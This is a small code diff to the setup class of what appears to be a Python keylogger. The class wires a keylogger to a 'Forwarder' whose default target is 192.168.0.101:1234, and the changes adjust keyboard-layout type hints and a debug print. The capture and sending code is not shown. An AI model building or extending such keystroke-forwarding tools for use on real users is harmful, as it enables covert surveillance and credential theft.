@@ -32,9 +32,10 @@ class Setup:
 
     def __init__(self, args) -> None:
         self.logger: Logger = Logger((lambda m: m if m else None)(args.mode))
-        keyboard_layout: dict[int, int] = self.read_keyboard_layout(
+        keyboard_layout: dict[int, list[int,int]] = self.read_keyboard_layout(
             (lambda k: k if k else "mini_keyboard")(args.keyboard)
         )
+        print(keyboard_layout)
         forwarder: Forwarder = Forwarder(
             server_ip=(lambda i: i if i else "192.168.0.101")(args.ip),
             port=(lambda p: p if p else "1234")(args.port),
@@ -50,8 +51,7 @@ class Setup:
         return self.__keylogger
 
     @staticmethod
-    def read_keyboard_layout(name: str = "mini_keyboard") -> dict[int, int]:
+    def read_keyboard_layout(name: str = "mini_keyboard") -> dict[int, list[int,int]]:
         with open(f"data/{name}.json", "r") as file:
-            print(json.load(file))
-            keyboard_layout: dict[int, int] = json.load(file)
+            keyboard_layout: dict[int, list[int,int]] = json.load(file)
         return keyboard_layout
